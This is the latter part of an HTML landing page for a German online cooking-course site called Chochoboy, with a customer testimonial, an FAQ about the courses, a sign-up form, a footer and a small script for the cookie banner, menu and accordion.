          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-4">"Ich habe mehrere Kochkurse ausprobiert, aber Chochoboy ist bei weitem der Beste. Die Videos sind hochwertig, die Rezepte funktionieren perfekt und die Community ist so unterstützend. Mein Lieblingsrezept ist jetzt der Schwarzwälder Kirschtorte-Kurs. Danke, Chochoboy, für diese wunderbare Erfahrung!"</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar3.jpg" alt="Thomas Becker" width="40" height="40" class="w-10 h-10 rounded-full object-cover" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Thomas Becker</div>
            <div class="text-xs text-gray-400">Kochbegeisterter aus Hamburg</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- FAQ -->
<section id="faq" class="py-20 bg-white">
  <div class="max-w-3xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Häufige Fragen</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Alles, was Sie über unsere Rezeptkurse wissen müssen</h2>
    </div>
    <div class="space-y-4">
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Für wen sind die Chochoboy Rezeptkurse geeignet?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Unsere Kurse sind für alle geeignet – von absoluten Kochanfängern bis hin zu erfahrenen Hobbyköchen. Wir bieten verschiedene Schwierigkeitsstufen an, sodass jeder den passenden Kurs findet. Egal ob Sie traditionelle deutsche Rezepte kennenlernen oder Ihre bestehenden Fähigkeiten vertiefen möchten.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Wie lange dauert ein Rezeptkurs bei Chochoboy?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Die Kursdauer variiert je nach Niveau und Inhalt. Grundkurse dauern in der Regel 4 Wochen, während der Meisterkoch-Rezeptkurs bis zu 12 Wochen umfassen kann. Alle Kurse sind selbstgesteuert, sodass Sie in Ihrem eigenen Tempo lernen können, ohne Zeitdruck.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Erhalte ich nach Abschluss ein Zertifikat?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Ja, nach erfolgreichem Abschluss eines Chochoboy-Kurses erhalten Sie ein offizielles digitales Zertifikat. Dieses Zertifikat bestätigt Ihre erlernten Fähigkeiten und Ihr Wissen über deutsche Rezepte und traditionelle Kochtechniken. Es kann jederzeit heruntergeladen und geteilt werden.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Kann ich die Kurse auf mobilen Geräten absolvieren?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Absolut! Unsere Plattform ist vollständig mobiloptimiert und funktioniert auf Smartphones, Tablets und Computern. Sie können Ihre Lehrvideos und Rezepte jederzeit und überall abrufen. Eine stabile Internetverbindung ist empfohlen für die beste Streaming-Qualität unserer Kochvideos.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Gibt es eine Geld-zurück-Garantie?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Ja, wir bieten eine 30-Tage-Geld-zurück-Garantie für alle unsere Kurse. Wenn Sie aus irgendeinem Grund nicht zufrieden sind, erstatten wir Ihnen den vollen Betrag ohne Fragen. Wir sind von der Qualität unserer deutschen Rezeptkurse überzeugt und möchten, dass Sie mit Ihrer Entscheidung zufrieden sind.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Welche Zutaten benötige ich für die Kurse?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Jeder Kurs enthält eine vollständige Einkaufsliste mit allen benötigten Zutaten. Die meisten Zutaten für deutsche Traditionsrezepte sind in jedem deutschen Supermarkt erhältlich. Für spezielle regionale Zutaten geben wir Hinweise auf Online-Shops oder Alternativen, die leicht zu beschaffen sind.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Wie kann ich dem Chochoboy Community-Forum beitreten?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Nach der Kursanmeldung erhalten Sie automatisch Zugang zu unserem exklusiven Community-Forum. Dort können Sie Fragen stellen, Ihre Kochfortschritte teilen, Rezeptideen austauschen und sich mit anderen Kochbegeisterten vernetzen. Unsere Meisterköche sind regelmäßig aktiv und beantworten Ihre Fragen persönlich.</div>
      </div>
    </div>
  </div>
</section>

<!-- CTA -->
<section id="cta" class="py-20 bg-primary">
  <div class="max-w-3xl mx-auto px-4 text-center">
    <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Beginnen Sie Ihre Reise zur deutschen Rezeptmeisterschaft</h2>
    <p class="text-white/80 mb-8 text-lg">Melden Sie sich noch heute an und erhalten Sie Zugang zu über 200 authentischen deutschen Rezepten und Profi-Kochkursen.</p>
    <form class="flex flex-col sm:flex-row gap-3 max-w-md mx-auto" onsubmit="return false;">
      <input type="text" placeholder="Ihr vollständiger Name" class="flex-1 px-4 py-3 rounded-xl text-gray-900 focus:outline-none" required>
      <input type="email" placeholder="Ihre E-Mail-Adresse" class="flex-1 px-4 py-3 rounded-xl text-gray-900 focus:outline-none" required>
      <button type="submit" class="px-6 py-3 bg-white font-semibold rounded-xl hover:bg-gray-100 transition" style="color: #3B82F6;">Kostenlos anmelden</button>
    </form>
    <p class="text-white/60 text-xs mt-4">Durch die Anmeldung stimmen Sie unserer <a href="privacy-policy.html" class="underline text-white/80">Datenschutzerklärung</a></p>
  </div>
</section>

<!-- Disclaimer (для медицины/финансов/юридических тем) -->


<!-- Footer -->
<footer id="main-footer" class="bg-gray-900 text-gray-400 py-12">
  <div class="max-w-6xl mx-auto px-4">
    <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
      <div class="md:col-span-2">
        <div class="text-white font-bold text-xl mb-3">Chochoboy</div>
        <p class="text-sm leading-relaxed max-w-xs">Chochoboy bringt Ihnen authentische deutsche Rezepte und traditionelle Kochkunst durch professionelle Online-Meisterkurse.</p>
        <div class="mt-4 text-sm space-y-1">
          <div>📍 Kurfürstendamm 42, 10719 Berlin, Deutschland</div>
          <div>📞 +49 30 123 456 78</div>
          <div>✉️ info@chochoboy-site.com</div>
        </div>
      </div>
      <div>
        <div class="text-white font-semibold mb-3">Navigation</div>
        <ul class="space-y-2 text-sm">
          <li><a href="/" class="hover:text-white transition">Startseite</a></li>
          <li><a href="about.html" class="hover:text-white transition">Über uns</a></li>
          <li><a href="contact.html" class="hover:text-white transition">Kontakt</a></li>
        </ul>
      </div>
      <div>
        <div class="text-white font-semibold mb-3">Rechtliches</div>
        <ul class="space-y-2 text-sm">
          <li><a href="privacy-policy.html" class="hover:text-white transition">Datenschutz</a></li>
          <li><a href="terms.html" class="hover:text-white transition">AGB</a></li>
        </ul>
      </div>
    </div>
    <div class="border-t border-gray-800 pt-6 text-sm text-center">
      © 2025 Chochoboy. Alle Rechte vorbehalten.
    </div>
  </div>
</footer>

<script>
  // Cookie banner
  function acceptCookies(type) {
    localStorage.setItem('cookies_accepted', type);
    document.getElementById('cookie-banner').style.display = 'none';
  }
  window.addEventListener('DOMContentLoaded', function() {
    if (!localStorage.getItem('cookies_accepted')) {
      document.getElementById('cookie-banner').style.display = 'block';
    }
  });

  // Mobile menu
  function toggleMenu() {
    var m = document.getElementById('mobile-menu');
    m.classList.toggle('hidden');
  }

  // FAQ accordion
  function toggleFaq(btn) {
    var answer = btn.nextElementSibling;
    var icon = btn.querySelector('svg');
    answer.classList.toggle('open');
    icon.style.transform = answer.classList.contains('open') ? 'rotate(180deg)' : '';
  }
</script>
</body>
</html>
